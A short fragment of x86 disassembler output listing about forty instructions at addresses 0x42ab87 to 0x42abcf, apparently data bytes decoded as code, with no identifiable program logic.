  42ab87:	pop    eax
  42ab88:	sbb    al,0x0
  42ab8a:	add    BYTE PTR [eax],al
  42ab8c:	push   ecx
  42ab8d:	cmp    bl,BYTE PTR [edi+ebp*2+0x51]
  42ab91:	js     0x42abe8
  42ab93:	jbe    0x42ac07
  42ab95:	arpl   WORD PTR [esi+0x75],dx
  42ab98:	popa   
  42ab99:	push   esi
  42ab9a:	pop    esp
  42ab9b:	outs   dx,DWORD PTR ds:[esi]
  42ab9c:	ins    DWORD PTR es:[edi],dx
  42ab9d:	dec    eax
  42ab9e:	inc    edi
  42ab9f:	push   0x6c445178
  42aba4:	jbe    0x42ac17
  42aba6:	pop    esp
  42aba7:	push   0x70
  42aba9:	js     0x42ac0c
  42abab:	ins    BYTE PTR es:[edi],dx
  42abac:	ins    BYTE PTR es:[edi],dx
  42abad:	dec    eax
  42abae:	addr16 pop esp
  42abb0:	push   0x4a
  42abb2:	jb     0x42ac16
  42abb4:	push   esp
  42abb5:	ins    DWORD PTR es:[edi],dx
  42abb6:	push   edx
  42abb7:	bound  eax,QWORD PTR [edi+0x6d]
  42abba:	push   eax
  42abbb:	arpl   WORD PTR [esi+0x77],ax
  42abbe:	pop    esp
  42abbf:	jo     0x42ac2b
  42abc1:	dec    ecx
  42abc2:	inc    ebp
  42abc3:	push   bp
  42abc5:	ins    BYTE PTR es:[edi],dx
  42abc6:	inc    ebp
  42abc7:	dec    ebp
  42abc8:	jne    0x42ac41
  42abca:	jbe    0x42ac15
  42abcc:	cs jo  0x42ac33
  42abcf:	bound  eax,QWORD PTR [eax]
	...
